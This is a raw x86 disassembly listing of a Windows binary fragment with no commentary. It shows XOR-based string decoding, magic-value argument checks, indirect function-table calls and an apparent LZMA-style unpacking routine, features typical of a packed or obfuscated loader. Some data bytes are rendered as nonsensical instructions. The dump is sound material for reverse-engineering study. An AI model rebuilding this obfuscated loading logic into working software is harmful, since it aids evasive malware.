  416501:	mov    ecx,DWORD PTR [ebp-0x8]
  416504:	xor    ecx,eax
  416506:	mov    eax,DWORD PTR [ebp+0x10]
  416509:	add    ecx,esi
  41650b:	mov    DWORD PTR [eax],ecx
  41650d:	pop    edi
  41650e:	pop    esi
  41650f:	pop    ebx
  416510:	leave  
  416511:	ret    0xc
  416514:	add    BYTE PTR [eax+0x43],al
  416517:	add    BYTE PTR [eax+eax*2],al
  41651a:	inc    ebx
  41651b:	add    BYTE PTR [eax],cl
  41651d:	inc    eax
  41651e:	inc    ebx
  41651f:	add    BYTE PTR [eax+eax*2],cl
  416522:	inc    ebx
  416523:	add    BYTE PTR [eax],dl
  416525:	inc    eax
  416526:	inc    ebx
  416527:	add    BYTE PTR [eax+eax*2],dl
  41652a:	inc    ebx
  41652b:	add    BYTE PTR [eax],bl
  41652d:	inc    eax
  41652e:	inc    ebx
  41652f:	add    BYTE PTR [eax+eax*2],bl
  416532:	inc    ebx
  416533:	add    BYTE PTR [eax],ah
  416535:	inc    eax
  416536:	inc    ebx
  416537:	add    BYTE PTR [eax+eax*2],ah
  41653a:	inc    ebx
  41653b:	add    BYTE PTR [eax],ch
  41653d:	inc    eax
  41653e:	inc    ebx
  41653f:	add    BYTE PTR [eax],al
  416541:	pusha  
  416542:	inc    ebx
  416543:	add    BYTE PTR [eax+eiz*2],al
  416546:	inc    ebx
  416547:	add    BYTE PTR [eax],cl
  416549:	pusha  
  41654a:	inc    ebx
  41654b:	add    BYTE PTR [eax+eiz*2],cl
  41654e:	inc    ebx
  41654f:	add    BYTE PTR [eax],dl
  416551:	pusha  
  416552:	inc    ebx
  416553:	add    BYTE PTR [eax+eiz*2],dl
  416556:	inc    ebx
  416557:	add    BYTE PTR [eax],bl
  416559:	pusha  
  41655a:	inc    ebx
  41655b:	add    BYTE PTR [eax+eiz*2],bl
  41655e:	inc    ebx
  41655f:	add    BYTE PTR [eax],al
  416561:	push   eax
  416562:	inc    ebx
  416563:	add    BYTE PTR [eax+edx*2],al
  416566:	inc    ebx
  416567:	add    BYTE PTR [eax],cl
  416569:	push   eax
  41656a:	inc    ebx
  41656b:	add    BYTE PTR [eax+edx*2],cl
  41656e:	inc    ebx
  41656f:	add    BYTE PTR [eax],dl
  416571:	push   eax
  416572:	inc    ebx
  416573:	add    BYTE PTR [eax+edx*2],dl
  416576:	inc    ebx
  416577:	add    BYTE PTR [eax],bl
  416579:	push   eax
  41657a:	inc    ebx
  41657b:	add    BYTE PTR [eax+edx*2],bl
  41657e:	inc    ebx
  41657f:	add    BYTE PTR [eax],al
  416581:	add    BYTE PTR [eax],al
  416583:	add    al,dl
  416585:	into   
  416586:	xor    BYTE PTR [ebp+0x0],cl
  416589:	add    BYTE PTR [eax],al
  41658b:	add    BYTE PTR [edx],al
  41658d:	add    BYTE PTR [eax],al
  41658f:	add    BYTE PTR ds:0xc0000000,bh
  416595:	add    DWORD PTR gs:[eax],eax
  416598:	rcr    BYTE PTR [ecx+0x1],0x0
  41659c:	add    BYTE PTR [eax+0x43],dh
  41659f:	add    BYTE PTR [eax+esi*2],al
  4165a2:	inc    ebx
  4165a3:	add    BYTE PTR [eax],cl
  4165a5:	jo     0x4165ea
  4165a7:	add    BYTE PTR [eax+esi*2],cl
  4165aa:	inc    ebx
  4165ab:	add    BYTE PTR [eax],dl
  4165ad:	jo     0x4165f2
  4165af:	add    BYTE PTR [eax+esi*2],dl
  4165b2:	inc    ebx
  4165b3:	add    BYTE PTR [eax],bl
  4165b5:	jo     0x4165fa
  4165b7:	add    BYTE PTR [eax+esi*2],bl
  4165ba:	inc    ebx
  4165bb:	add    BYTE PTR [eax],al
  4165bd:	add    BYTE PTR [eax],al
  4165bf:	add    BYTE PTR [edx+0x53],dl
  4165c2:	inc    esp
  4165c3:	push   ebx
  4165c4:	pop    es
  4165c5:	add    ecx,ecx
  4165c7:	outs   dx,DWORD PTR ds:[esi]
  4165c8:	adc    bl,BYTE PTR [eax]
  4165ca:	sbb    eax,DWORD PTR [ecx+ebx*4+0xc]
  4165ce:	push   esp
  4165cf:	jns    0x416625
  4165d1:	fbstp  TBYTE PTR [ecx+0x151]
  4165d7:	add    BYTE PTR [ebx+0x3a],al
  4165da:	pop    esp
  4165db:	inc    ebx
  4165dc:	jne    0x416650
  4165de:	jb     0x416645
  4165e0:	outs   dx,BYTE PTR ds:[esi]
  4165e1:	je     0x416627
  4165e3:	popa   
  4165e4:	je     0x416647
  4165e6:	pop    esp
  4165e7:	dec    ebp
  4165e8:	outs   dx,DWORD PTR ds:[esi]
  4165e9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  4165f1:	ins    BYTE PTR es:[edi],dx
  4165f2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4165f9:	dec    esi
  4165fa:	gs ja  0x4165fd
  4165fd:	mov    edx,DWORD PTR [ebp-0x14]
  416600:	sub    esp,0x108
  416606:	push   ebx
  416607:	mov    eax,ebx
  416609:	xchg   ecx,eax
  41660a:	mov    eax,DWORD PTR [ebp+0x8]
  41660d:	cmp    eax,0xf89c8585
  416612:	jne    0x416a95
  416618:	mov    eax,DWORD PTR [ebp+0xc]
  41661b:	cmp    eax,0xf89c8584
  416620:	jne    0x416a95
  416626:	mov    eax,DWORD PTR [ebp+0x24]
  416629:	mov    DWORD PTR [ebp-0x4],eax
  41662c:	mov    BYTE PTR [ebp-0x18],0x1b
  416630:	mov    BYTE PTR [ebp-0x17],0x18
  416634:	mov    BYTE PTR [ebp-0x16],0x5
  416638:	mov    BYTE PTR [ebp-0x15],0x4f
  41663c:	mov    BYTE PTR [ebp-0x14],0x4e
  416640:	mov    BYTE PTR [ebp-0x13],0x7c
  416644:	mov    BYTE PTR [ebp-0x20],0x9
  416648:	mov    BYTE PTR [ebp-0x1f],0xf
  41664c:	mov    BYTE PTR [ebp-0x1e],0x19
  416650:	mov    BYTE PTR [ebp-0x1d],0xe
  416654:	mov    BYTE PTR [ebp-0x1c],0x4f
  416658:	mov    BYTE PTR [ebp-0x1b],0x4e
  41665c:	mov    BYTE PTR [ebp-0x1a],0x7c
  416660:	mov    BYTE PTR [ebp-0x28],0xf
  416664:	mov    BYTE PTR [ebp-0x27],0x4
  416668:	mov    BYTE PTR [ebp-0x26],0x0
  41666c:	mov    BYTE PTR [ebp-0x25],0xb
  416670:	mov    BYTE PTR [ebp-0x24],0x1d
  416674:	mov    BYTE PTR [ebp-0x23],0xc
  416678:	push   esi
  416679:	mov    BYTE PTR [ebp-0x22],0x5
  41667d:	mov    BYTE PTR [ebp-0x21],0x7c
  416681:	xor    esi,esi
  416683:	mov    eax,0xf8
  416688:	lea    ecx,[ebp+esi*1-0x18]
  41668c:	movzx  edx,BYTE PTR [ecx]
  41668f:	xor    edx,0x74
  416692:	add    edx,eax
  416694:	inc    esi
  416695:	mov    BYTE PTR [ecx],dl
  416697:	cmp    esi,0x6
  41669a:	jb     0x416688
  41669c:	xor    esi,esi
  41669e:	lea    ecx,[ebp+esi*1-0x20]
  4166a2:	movzx  edx,BYTE PTR [ecx]
  4166a5:	xor    edx,0x74
  4166a8:	add    edx,eax
  4166aa:	inc    esi
  4166ab:	mov    BYTE PTR [ecx],dl
  4166ad:	cmp    esi,0x7
  4166b0:	jb     0x41669e
  4166b2:	xor    esi,esi
  4166b4:	lea    ecx,[ebp+esi*1-0x28]
  4166b8:	movzx  edx,BYTE PTR [ecx]
  4166bb:	xor    edx,0x74
  4166be:	add    edx,eax
  4166c0:	inc    esi
  4166c1:	mov    BYTE PTR [ecx],dl
  4166c3:	cmp    esi,0x8
  4166c6:	jb     0x4166b4
  4166c8:	lea    eax,[ebp-0x2c]
  4166cb:	mov    DWORD PTR [ebp-0x8],eax
  4166ce:	mov    ecx,DWORD PTR [ebp-0x8]
  4166d1:	mov    eax,0x7113fcef
  4166d6:	mov    DWORD PTR [ecx],eax
  4166d8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4166db:	push   edi
  4166dc:	mov    esi,0x4e22
  4166e1:	mov    ebx,0x3272e2
  4166e6:	cmp    ecx,eax
  4166e8:	jne    0x4167b3
  4166ee:	lea    eax,[esi+0x53]
  4166f1:	mov    WORD PTR [ebp-0x78],ax
  4166f5:	mov    eax,esi
  4166f7:	mov    WORD PTR [ebp-0x76],ax
  4166fb:	add    eax,0x5d
  4166fe:	mov    WORD PTR [ebp-0x74],ax
  416702:	lea    eax,[esi+0x1a]
  416705:	mov    WORD PTR [ebp-0x72],ax
  416709:	add    eax,0x41
  41670c:	mov    ecx,eax
  41670e:	lea    eax,[esi+0x15]
  416711:	mov    WORD PTR [ebp-0x66],ax
  416715:	mov    eax,esi
  416717:	mov    WORD PTR [ebp-0x64],ax
  41671b:	add    eax,0x14
  41671e:	mov    WORD PTR [ebp-0x62],ax
  416722:	mov    eax,0x469
  416727:	mov    WORD PTR [ebp-0x60],ax
  41672b:	mov    eax,0x5678
  416730:	mov    WORD PTR [ebp-0x5e],ax
  416734:	mov    eax,0x6118
  416739:	mov    WORD PTR [ebp-0x5c],ax
  41673d:	lea    eax,[ebp-0xe0]
  416743:	push   eax
  416744:	mov    eax,DWORD PTR [ebp+0xc]
  416747:	mov    edi,0x751089b
  41674c:	xor    eax,edi
  41674e:	add    eax,ebx
  416750:	push   eax
  416751:	mov    WORD PTR [ebp-0x70],cx
  416755:	lea    ecx,[esi+0x16]
  416758:	mov    edx,ecx
  41675a:	lea    eax,[ebp-0x78]
  41675d:	push   eax
  41675e:	mov    eax,DWORD PTR [ebp-0x4]
  416761:	mov    eax,DWORD PTR [eax+0x198]
  416767:	mov    WORD PTR [ebp-0x6e],dx
  41676b:	mov    edx,0x4f96
  416770:	mov    WORD PTR [ebp-0x6c],dx
  416774:	mov    DWORD PTR [ebp-0x6a],0x4e7d4e3b
  41677b:	mov    DWORD PTR [ebp-0x5a],0x4e38f10a
  416782:	mov    DWORD PTR [ebp-0xe0],0x1
  41678c:	mov    DWORD PTR [ebp-0xdc],0x255
  416796:	push   DWORD PTR [eax]
  416798:	mov    eax,DWORD PTR [ebp+0x10]
  41679b:	call   eax
  41679d:	mov    DWORD PTR [ebp-0x8],eax
  4167a0:	mov    eax,DWORD PTR [ebp-0x8]
  4167a3:	test   eax,eax
  4167a5:	je     0x4167b8
  4167a7:	xor    DWORD PTR ds:0x76586876,0x87687666
  4167b1:	jmp    0x4167b8
  4167b3:	mov    edi,0x751089b
  4167b8:	mov    eax,DWORD PTR [ebp-0x4]
  4167bb:	mov    ecx,DWORD PTR [eax+0x18c]
  4167c1:	xor    eax,eax
  4167c3:	cmp    DWORD PTR [ecx],eax
  4167c5:	jne    0x416a30
  4167cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4167ce:	mov    ecx,DWORD PTR [ecx+0x17c]
  4167d4:	mov    DWORD PTR [ecx],eax
  4167d6:	mov    ecx,DWORD PTR [ebp-0x4]
  4167d9:	mov    ecx,DWORD PTR [ecx+0x180]
  4167df:	mov    DWORD PTR [ecx],eax
  4167e1:	mov    eax,0x4f8f
  4167e6:	mov    WORD PTR [ebp-0x9c],ax
  4167ed:	mov    eax,esi
  4167ef:	mov    WORD PTR [ebp-0x9a],ax
  4167f6:	mov    eax,0x4e7f
  4167fb:	mov    WORD PTR [ebp-0x98],ax
  416802:	add    eax,0xffffffc0
  416805:	mov    WORD PTR [ebp-0x96],ax
  41680c:	mov    eax,0x4f92
  416811:	mov    WORD PTR [ebp-0x94],ax
  416818:	mov    eax,0x4e3e
  41681d:	mov    WORD PTR [ebp-0x92],ax
  416824:	add    eax,0x3f
  416827:	mov    WORD PTR [ebp-0x90],ax
  41682e:	mov    eax,0x4e38
  416833:	mov    WORD PTR [ebp-0x8e],ax
  41683a:	mov    eax,esi
  41683c:	mov    WORD PTR [ebp-0x8c],ax
  416843:	mov    eax,0x4e3b
  416848:	mov    WORD PTR [ebp-0x8a],ax
  41684f:	mov    eax,0x99ff
  416854:	mov    WORD PTR [ebp-0x88],ax
  41685b:	mov    eax,0x828e
  416860:	mov    WORD PTR [ebp-0x86],ax
  416867:	mov    eax,0xd78d
  41686c:	mov    WORD PTR [ebp-0x84],ax
  416873:	add    eax,0x1c
  416876:	mov    WORD PTR [ebp-0x82],ax
  41687d:	mov    eax,0x27a8
  416882:	mov    WORD PTR [ebp-0x80],ax
  416886:	mov    eax,0x47a8
  41688b:	mov    WORD PTR [ebp-0x7e],ax
  41688f:	mov    eax,0x4e39
  416894:	push   0x8
  416896:	mov    WORD PTR [ebp-0x7c],ax
  41689a:	mov    DWORD PTR [ebp-0x10],0xb00040f
  4168a1:	mov    DWORD PTR [ebp-0xc],0x7c050c1d
  4168a8:	lea    eax,[ebp-0x10]
  4168ab:	pop    ecx
  4168ac:	mov    dl,BYTE PTR [eax]
  4168ae:	xor    dl,0x74
  4168b1:	sub    dl,0x8
  4168b4:	mov    BYTE PTR [eax],dl
  4168b6:	inc    eax
  4168b7:	dec    ecx
  4168b8:	jne    0x4168ac
  4168ba:	lea    eax,[ebp-0x10]
  4168bd:	mov    DWORD PTR [ebp-0xdc],eax
  4168c3:	lea    eax,[ebp-0xe0]
  4168c9:	push   eax
  4168ca:	mov    eax,DWORD PTR [ebp+0xc]
  4168cd:	xor    eax,edi
  4168cf:	add    eax,ebx
  4168d1:	push   eax
  4168d2:	mov    eax,DWORD PTR [ebp-0x4]
  4168d5:	add    eax,0x66
  4168d8:	push   eax
  4168d9:	mov    eax,DWORD PTR [ebp-0x4]
  4168dc:	mov    eax,DWORD PTR [eax+0x198]
  4168e2:	mov    DWORD PTR [ebp-0xe0],0x1
  4168ec:	push   DWORD PTR [eax]
  4168ee:	mov    eax,DWORD PTR [ebp+0x10]
  4168f1:	call   eax
  4168f3:	mov    ecx,DWORD PTR [ebp+0x8]
  4168f6:	xor    ecx,edi
  4168f8:	add    ecx,ebx
  4168fa:	mov    DWORD PTR [ebp-0x8],eax
  4168fd:	cmp    eax,ecx
  4168ff:	jne    0x41691a
  416901:	mov    eax,ds:0x33730bee
  416906:	or     eax,0x22150bef
  41690b:	mov    ds:0x33730bee,eax
  416910:	add    eax,0x3372e90f
  416915:	mov    ds:0x33730bee,eax
  41691a:	mov    ecx,0x4f8a
  41691f:	mov    eax,ecx
  416921:	mov    WORD PTR [ebp-0x40],ax
  416925:	mov    eax,0x4e71
  41692a:	mov    edx,eax
  41692c:	mov    WORD PTR [ebp-0x3e],dx
  416930:	lea    edx,[ecx+0xf]
  416933:	mov    WORD PTR [ebp-0x3c],dx
  416937:	add    edx,0xfffffff8
  41693a:	mov    WORD PTR [ebp-0x3a],dx
  41693e:	lea    edx,[ecx+0x9]
  416941:	mov    WORD PTR [ebp-0x38],dx
  416945:	add    edx,0x19
  416948:	mov    WORD PTR [ebp-0x36],dx
  41694c:	lea    edx,[ecx+0x1b]
  41694f:	mov    WORD PTR [ebp-0x34],dx
  416953:	mov    WORD PTR [ebp-0x32],cx
  416957:	mov    ecx,esi
  416959:	mov    WORD PTR [ebp-0x30],cx
  41695d:	lea    ecx,[edx+0x5]
  416960:	mov    edx,ecx
  416962:	mov    WORD PTR [ebp-0x54],dx
  416966:	mov    edx,eax
  416968:	mov    WORD PTR [ebp-0x52],dx
  41696c:	add    edx,0x8
  41696f:	mov    WORD PTR [ebp-0x50],dx
  416973:	mov    WORD PTR [ebp-0x4e],ax
  416977:	add    eax,0x2
  41697a:	mov    WORD PTR [ebp-0x4c],ax
  41697e:	lea    eax,[ecx-0x1e]
  416981:	mov    WORD PTR [ebp-0x4a],ax
  416985:	add    eax,0xfffffff9
  416988:	mov    WORD PTR [ebp-0x48],ax
  41698c:	mov    WORD PTR [ebp-0x46],cx
  416990:	mov    WORD PTR [ebp-0x44],si
  416994:	mov    eax,DWORD PTR [ebp+0x8]
  416997:	movzx  ecx,WORD PTR [ebp-0x54]
  41699b:	xor    eax,edi
  41699d:	add    eax,ebx
  41699f:	xor    eax,ecx
  4169a1:	mov    WORD PTR [ebp-0x54],ax
  4169a5:	mov    eax,DWORD PTR [ebp+0x8]
  4169a8:	movzx  ecx,WORD PTR [ebp-0x40]
  4169ac:	xor    eax,edi
  4169ae:	add    eax,ebx
  4169b0:	xor    eax,ecx
  4169b2:	mov    WORD PTR [ebp-0x40],ax
  4169b6:	xor    eax,eax
  4169b8:	mov    WORD PTR [ebp-0xf4],ax
  4169bf:	mov    WORD PTR [ebp-0x108],ax
  4169c6:	mov    edi,DWORD PTR [ebp+0x24]
  4169c9:	lea    eax,[ebp-0xf4]
  4169cf:	lea    edx,[ebp-0x54]
  4169d2:	mov    DWORD PTR [ebp-0xe0],0x2
  4169dc:	mov    DWORD PTR [ebp-0xdc],eax
  4169e2:	call   0x419373
  4169e7:	mov    DWORD PTR [ebp-0xd8],eax
  4169ed:	lea    eax,[ebp-0xe0]
  4169f3:	push   eax
  4169f4:	mov    eax,DWORD PTR [ebp+0xc]
  4169f7:	xor    eax,0x751089b
  4169fc:	add    eax,ebx
  4169fe:	push   eax
  4169ff:	lea    eax,[ebp-0x9c]
  416a05:	push   eax
  416a06:	push   DWORD PTR [ebp-0x8]
  416a09:	mov    eax,DWORD PTR [ebp+0x10]
  416a0c:	call   eax
  416a0e:	mov    edi,DWORD PTR [ebp+0x24]
  416a11:	lea    eax,[ebp-0x108]
  416a17:	lea    edx,[ebp-0x40]
  416a1a:	mov    DWORD PTR [ebp-0xdc],eax
  416a20:	call   0x419373
  416a25:	mov    DWORD PTR [ebp-0xd8],eax
  416a2b:	mov    edi,0x751089b
  416a30:	mov    eax,DWORD PTR [ebp+0x14]
  416a33:	push   DWORD PTR [ebp-0x4]
  416a36:	push   DWORD PTR [ebp+0x20]
  416a39:	push   DWORD PTR [ebp+0x1c]
  416a3c:	push   DWORD PTR [ebp+0x18]
  416a3f:	push   DWORD PTR [ebp+0x10]
  416a42:	push   DWORD PTR [ebp+0x8]
  416a45:	push   DWORD PTR [ebp+0xc]
  416a48:	call   0x417bef
  416a4d:	test   eax,eax
  416a4f:	je     0x416a93
  416a51:	add    DWORD PTR [ebp-0x4],eax
  416a54:	push   DWORD PTR [ebp-0x4]
  416a57:	lea    esi,[ebp+0x4]
  416a5a:	call   0x416e83
  416a5f:	mov    eax,DWORD PTR [ebp-0x4]
  416a62:	mov    eax,DWORD PTR [eax+0x1c8]
  416a68:	mov    eax,DWORD PTR [eax]
  416a6a:	xor    eax,edi
  416a6c:	add    eax,ebx
  416a6e:	mov    eax,DWORD PTR [ebp-0x4]
  416a71:	jne    0x416a89
  416a73:	mov    ecx,DWORD PTR [ebp-0x4]
  416a76:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416a7c:	push   DWORD PTR [ecx]
  416a7e:	mov    eax,DWORD PTR [eax+0x1d8]
  416a84:	call   DWORD PTR [eax+0x28]
  416a87:	jmp    0x416a93
  416a89:	mov    eax,DWORD PTR [eax+0x17c]
  416a8f:	mov    eax,DWORD PTR [eax]
  416a91:	add    DWORD PTR [esi],eax
  416a93:	pop    edi
  416a94:	pop    esi
  416a95:	pop    ebx
  416a96:	leave  
  416a97:	ret    0x20
  416a9a:	push   edi
  416a9b:	push   esi
  416a9c:	push   ebx
  416a9d:	push   ebp
  416a9e:	mov    ebp,esp
  416aa0:	mov    eax,DWORD PTR [ebp+0x24]
  416aa3:	add    DWORD PTR [ebp+0x28],eax
  416aa6:	push   eax
  416aa7:	cld    
  416aa8:	mov    esi,DWORD PTR [ebp+0x18]
  416aab:	add    DWORD PTR [ebp+0x1c],esi
  416aae:	push   esi
  416aaf:	mov    esi,DWORD PTR [ebp+0x14]
  416ab2:	lods   eax,DWORD PTR ds:[esi]
  416ab3:	xchg   edx,eax
  416ab4:	push   edx
  416ab5:	mov    cl,BYTE PTR [esi-0x2]
  416ab8:	or     eax,0xffffffff
  416abb:	shl    eax,cl
  416abd:	not    eax
  416abf:	push   eax
  416ac0:	mov    cl,dh
  416ac2:	or     eax,0xffffffff
  416ac5:	shl    eax,cl
  416ac7:	not    eax
  416ac9:	push   eax
  416aca:	add    cl,dl
  416acc:	mov    edi,esi
  416ace:	sub    esp,0xc
  416ad1:	sub    eax,eax
  416ad3:	inc    eax
  416ad4:	push   eax
  416ad5:	push   eax
  416ad6:	push   eax
  416ad7:	push   eax
  416ad8:	push   eax
  416ad9:	push   edi
  416ada:	sub    esi,esi
  416adc:	push   esi
  416add:	or     ebx,0xffffffff
  416ae0:	mov    eax,0x300
  416ae5:	shl    eax,cl
  416ae7:	lea    ecx,[eax+0x736]
  416aed:	mov    eax,0x4000400
  416af2:	shr    ecx,1
  416af4:	rep stos DWORD PTR es:[edi],eax
  416af6:	push   0x5
  416af8:	pop    ecx
  416af9:	call   0x416de4
  416afe:	loop   0x416af9
  416b00:	lea    esi,[esi]
  416b02:	lea    edi,[edi]
  416b04:	mov    edi,DWORD PTR [ebp-0x4]
  416b07:	mov    eax,DWORD PTR [ebp-0x10]
  416b0a:	sub    edi,DWORD PTR [ebp+0x24]
  416b0d:	and    eax,edi
  416b0f:	mov    DWORD PTR [ebp-0x18],eax
  416b12:	mov    al,0x0
  416b14:	call   0x416dfc
  416b19:	jne    0x416bb4
  416b1f:	mov    cl,BYTE PTR [ebp-0xc]
  416b22:	and    edi,DWORD PTR [ebp-0x14]
  416b25:	shl    edi,cl
  416b27:	sub    cl,0x8
  416b2a:	neg    cl
  416b2c:	shr    esi,cl
  416b2e:	pop    eax
  416b2f:	add    edi,esi
  416b31:	pop    esi
  416b32:	lea    edi,[edi+edi*2]
  416b35:	shl    edi,0x8
  416b38:	cmp    al,0x7
  416b3a:	pop    edx
  416b3b:	lea    ecx,[esi+edi*2+0xe6c]
  416b42:	push   ecx
  416b43:	push   esi
  416b44:	mov    esi,0x100
  416b49:	push   eax
  416b4a:	mov    al,0x1
  416b4c:	jb     0x416b82
  416b4e:	mov    edi,DWORD PTR [ebp-0x4]
  416b51:	sub    edi,DWORD PTR [ebp-0x24]
  416b54:	movzx  edi,BYTE PTR [edi]
  416b57:	mov    ebp,DWORD PTR [ebp-0x34]
  416b5a:	shl    edi,1
  416b5c:	mov    ecx,esi
  416b5e:	and    esi,edi
  416b60:	add    ecx,esi
  416b62:	lea    ebp,[ebp+ecx*2+0x0]
  416b66:	call   0x416e1b
  416b6b:	mov    ecx,eax
  416b6d:	shr    esi,0x8
  416b70:	and    ecx,0x1
  416b73:	cmp    esi,ecx
  416b75:	mov    esi,0x100
  416b7a:	jne    0x416b8a
  416b7c:	cmp    eax,esi
  416b7e:	jb     0x416b57
  416b80:	jmp    0x416b96
  416b82:	mov    ebp,DWORD PTR [ebp-0x34]
  416b85:	call   0x416e1b
  416b8a:	inc    eax
  416b8b:	inc    esi
  416b8c:	sub    eax,0x1
  416b8f:	sub    esi,0x1
  416b92:	cmp    eax,esi
  416b94:	jb     0x416b82
  416b96:	pop    edx
  416b97:	inc    edx
  416b98:	cmp    edx,0x5
  416b9b:	dec    edx
  416b9c:	mov    ecx,edx
  416b9e:	jb     0x416baf
  416ba0:	inc    edx
  416ba1:	cmp    edx,0xb
  416ba4:	dec    edx
  416ba5:	mov    cl,0x4
  416ba7:	dec    cl
  416ba9:	jb     0x416baf
  416bab:	mov    cl,0x7
  416bad:	dec    cl
  416baf:	sub    edx,ecx
  416bb1:	push   edx
  416bb2:	jmp    0x416c03
  416bb4:	mov    al,0xc1
  416bb6:	dec    al
  416bb8:	call   0x416e0c
  416bbd:	jne    0x416bd3
  416bbf:	pop    eax
  416bc0:	pop    edi
  416bc1:	pop    edx
  416bc2:	pop    ecx
  416bc3:	pop    edx
  416bc4:	pop    ecx
  416bc5:	push   DWORD PTR [esp]
  416bc8:	push   ecx
  416bc9:	push   edx
  416bca:	mov    edx,0x664
  416bcf:	mov    cl,0x0
  416bd1:	jmp    0x416c46
  416bd3:	mov    al,0xcd
  416bd5:	dec    al
  416bd7:	call   0x416e0c
  416bdc:	jne    0x416c0c
  416bde:	mov    al,0xf1
  416be0:	dec    al
  416be2:	call   0x416dfc
  416be7:	jne    0x416c3c
  416be9:	pop    eax
  416bea:	cmp    al,0x7
  416bec:	mov    al,0x9
  416bee:	jb     0x416bf2
  416bf0:	mov    al,0xb
  416bf2:	push   eax
  416bf3:	mov    esi,DWORD PTR [ebp-0x4]
  416bf6:	sub    esi,DWORD PTR [ebp-0x24]
  416bf9:	cmp    esi,DWORD PTR [ebp+0x24]
  416bfc:	jb     0x416dd3
  416c02:	lods   al,BYTE PTR ds:[esi]
  416c03:	mov    edi,DWORD PTR [ebp-0x4]
  416c06:	stos   BYTE PTR es:[edi],al
  416c07:	jmp    0x416d9a
  416c0c:	mov    al,0xd8
  416c0e:	call   0x416e0c
  416c13:	mov    esi,DWORD PTR [ebp-0x28]
  416c16:	je     0x416c33
  416c18:	mov    al,0xe4
  416c1a:	call   0x416e0c
  416c1f:	mov    esi,DWORD PTR [ebp-0x2c]
  416c22:	je     0x416c2d
  416c24:	mov    esi,DWORD PTR [ebp-0x30]
  416c27:	mov    ecx,DWORD PTR [ebp-0x2c]
  416c2a:	mov    DWORD PTR [ebp-0x30],ecx
  416c2d:	mov    ecx,DWORD PTR [ebp-0x28]
  416c30:	mov    DWORD PTR [ebp-0x2c],ecx
  416c33:	mov    ecx,DWORD PTR [ebp-0x24]
  416c36:	mov    DWORD PTR [ebp-0x28],ecx
  416c39:	mov    DWORD PTR [ebp-0x24],esi
  416c3c:	pop    eax
  416c3d:	pop    edi
  416c3e:	pop    ecx
  416c3f:	mov    edx,0xa68
  416c44:	mov    cl,0x8
  416c46:	add    edx,edi
  416c48:	push   edx
  416c49:	push   edi
  416c4a:	cmp    al,0x7
  416c4c:	mov    al,cl
  416c4e:	jb     0x416c52
  416c50:	add    al,0x3
  416c52:	push   eax
  416c53:	mov    ebp,DWORD PTR [ebp-0x34]
  416c56:	call   0x416e19
  416c5b:	jne    0x416c71
  416c5d:	mov    eax,DWORD PTR [ebp-0x18]
  416c60:	mov    edi,DWORD PTR [ebp-0x34]
  416c63:	shl    eax,0x3
  416c66:	sub    ecx,ecx
  416c68:	push   0x8
  416c6a:	pop    esi
  416c6b:	lea    edi,[edi+eax*2+0x4]
  416c6f:	jmp    0x416ca6
  416c71:	mov    ebp,DWORD PTR [ebp-0x34]
  416c74:	add    ebp,0x2
  416c77:	call   0x416e19
  416c7c:	jne    0x416c96
  416c7e:	mov    eax,DWORD PTR [ebp-0x18]
  416c81:	mov    edi,DWORD PTR [ebp-0x34]
  416c84:	shl    eax,0x3
  416c87:	push   0x8
  416c89:	pop    ecx
  416c8a:	push   0x8
  416c8c:	pop    esi
  416c8d:	lea    edi,[edi+eax*2+0x104]
  416c94:	jmp    0x416ca6
  416c96:	mov    edi,0x204
  416c9b:	add    edi,DWORD PTR [ebp-0x34]
  416c9e:	push   0x10
  416ca0:	pop    ecx
  416ca1:	mov    esi,0x100
  416ca6:	mov    DWORD PTR [ebp-0x1c],ecx
  416ca9:	sub    eax,eax
  416cab:	inc    eax
  416cac:	mov    ebp,edi
  416cae:	call   0x416e1b
  416cb3:	mov    ecx,eax
  416cb5:	sub    ecx,esi
  416cb7:	jb     0x416cac
  416cb9:	add    DWORD PTR [ebp-0x1c],ecx
  416cbc:	cmp    DWORD PTR [ebp-0x3c],0x4
  416cc0:	jae    0x416d76
  416cc6:	add    DWORD PTR [ebp-0x3c],0x7
  416cca:	mov    ecx,DWORD PTR [ebp-0x1c]
  416ccd:	cmp    ecx,0x4
  416cd0:	jb     0x416cd5
  416cd2:	push   0x3
  416cd4:	pop    ecx
  416cd5:	mov    edi,DWORD PTR [ebp-0x38]
  416cd8:	shl    ecx,0x6
  416cdb:	sub    eax,eax
  416cdd:	inc    eax
  416cde:	push   0x40
  416ce0:	pop    esi
  416ce1:	lea    edi,[edi+ecx*2+0x360]
  416ce8:	mov    ebp,edi
  416cea:	call   0x416e1b
  416cef:	mov    ecx,eax
  416cf1:	sub    ecx,esi
  416cf3:	jb     0x416ce8
  416cf5:	mov    DWORD PTR [ebp-0x18],ecx
  416cf8:	mov    DWORD PTR [ebp-0x24],ecx
  416cfb:	cmp    ecx,0x4
  416cfe:	jb     0x416d73
  416d00:	mov    esi,ecx
  416d02:	and    DWORD PTR [ebp-0x24],0x1
  416d06:	shr    esi,1
  416d08:	or     DWORD PTR [ebp-0x24],0x2
  416d0c:	dec    esi
  416d0d:	cmp    ecx,0xe
  416d10:	jae    0x416d2b
  416d12:	mov    eax,0x2af
  416d17:	sub    eax,ecx
  416d19:	mov    ecx,esi
  416d1b:	shl    BYTE PTR [ebp-0x24],cl
  416d1e:	add    eax,DWORD PTR [ebp-0x24]
  416d21:	shl    eax,1
  416d23:	add    eax,DWORD PTR [ebp-0x38]
  416d26:	mov    DWORD PTR [ebp-0x34],eax
  416d29:	jmp    0x416d58
  416d2b:	sub    esi,0x4
  416d2e:	call   0x416dd8
  416d33:	shr    ebx,1
  416d35:	shl    DWORD PTR [ebp-0x24],1
  416d38:	cmp    DWORD PTR [ebp-0x20],ebx
  416d3b:	jb     0x416d43
  416d3d:	inc    DWORD PTR [ebp-0x24]
  416d40:	sub    DWORD PTR [ebp-0x20],ebx
  416d43:	dec    esi
  416d44:	jne    0x416d2e
  416d46:	mov    eax,0x644
  416d4b:	add    eax,DWORD PTR [ebp-0x38]
  416d4e:	mov    DWORD PTR [ebp-0x34],eax
  416d51:	shl    DWORD PTR [ebp-0x24],0x4
  416d55:	push   0x4
  416d57:	pop    esi
  416d58:	sub    edi,edi
  416d5a:	inc    edi
  416d5b:	mov    eax,edi
  416d5d:	mov    ebp,DWORD PTR [ebp-0x34]
  416d60:	call   0x416e1b
  416d65:	test   al,0x1
  416d67:	je     0x416d6c
  416d69:	or     DWORD PTR [ebp-0x24],edi
  416d6c:	shl    edi,1
